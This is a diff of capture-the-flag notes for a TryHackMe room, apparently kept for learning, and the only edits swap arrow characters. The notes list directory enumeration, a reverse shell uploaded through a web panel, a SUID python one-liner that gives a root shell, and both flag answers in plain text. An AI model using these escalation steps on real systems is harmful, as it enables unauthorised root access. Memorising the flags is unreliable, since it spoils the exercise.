@@ -10,7 +10,7 @@ https://tryhackme.com/room/rrootme
 	- one page side, nothing interesting on code
 	- gobuster:
 		- `gobuster dir -u <IP> -w <wordlist>`
-			- -> /css, /js, /uploads, /panel
+			- → /css, /js, /uploads, /panel
 			- insteresting is panel (uploadong files) and uploads 
 
 - getting reverse shell
@@ -20,12 +20,12 @@ https://tryhackme.com/room/rrootme
 	- run the shell from /uploads
 	- find a user.txt flag
 		- `find / -name user.txt 2>/dev/null`
-		- -> THM{y0u_g0t_a_sh3ll}
+		- → THM{y0u_g0t_a_sh3ll}
 
 - root the machine
-	- `sudo -l` -> nothing
+	- `sudo -l` → nothing
 	- get SUID files `find / -user root -perm /4000`
-		- -> interesting: /usr/bin/python
+		- → interesting: /usr/bin/python
 		- exploit: `python -c 'import os; os.execl("/bin/sh","sh","-p")'`
 			- if you don't have stable shell you get empty line but try `whoami`!!!
 			- root flag: THM{pr1v1l3g3_3sc4l4t10n} 
